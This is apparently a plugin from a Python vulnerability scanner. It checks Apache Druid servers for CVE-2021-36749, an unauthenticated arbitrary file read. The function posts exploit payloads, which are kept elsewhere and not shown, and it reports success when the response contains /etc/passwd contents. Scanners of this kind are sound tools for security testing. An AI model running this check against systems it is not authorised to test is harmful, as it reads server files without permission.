#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.logger import logger
from thirdparty import requests
import re

def cve_2021_36749_scan(self, url):
    ''' Apache Druid对用户指定的HTTP InputSource没有做限制, 
        并且Apache Druid默认管理页面是不需要认证即可访问的
            因此未经授权的远程攻击者 可以通过构造恶意参数读取服务器上的任意文件
        
        Apache Druid <= 0.21.1
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'FileRead'
    vul_info['vul_id'] = 'CVE-2021-36749'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {
        'Content-Type': 'application/json;charset=utf-8',
        'Referer': 'http://' + logger.get_domain(url),
        'Origin': 'http://' + logger.get_domain(url),
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in self.cve_2021_36749_payloads:
        path = payload['path']
        data = payload['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.post(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG


            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
